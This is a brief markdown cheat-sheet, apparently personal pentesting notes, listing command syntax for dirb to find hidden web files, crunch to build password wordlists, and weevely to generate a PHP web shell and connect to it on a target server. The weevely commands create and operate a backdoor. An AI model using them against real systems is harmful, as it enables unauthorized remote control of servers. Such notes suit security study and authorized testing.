# fuzzer

# dirb
To get hidden files.
{% highlight bash %}
> dirb [domain]
{% endhighlight %}

# crunch
To generate dictionaries:
{% highlight bash %}
> crunch <min> <max> [options]
{% endhighlight %}

# weevely
To generate a shell:
{% highlight bash %}
> weevely generate [password] /home/kali/shell.php
> weevely http://ip/shell.php [password]
{% endhighlight %}
